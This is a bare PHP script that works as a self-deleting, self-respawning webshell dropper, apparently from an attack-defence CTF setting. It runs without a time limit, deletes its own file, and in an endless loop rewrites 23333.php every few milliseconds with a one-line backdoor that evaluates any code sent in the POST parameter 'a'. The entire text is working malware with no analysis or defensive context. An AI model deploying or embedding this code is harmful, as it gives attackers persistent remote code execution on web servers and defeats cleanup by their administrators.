<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '23333.php';
    $code = '<?php eval($_POST[\'a\']); ?>';
    while (1) {
        file_put_contents($file, $code);
        usleep(5000);
    }
?>
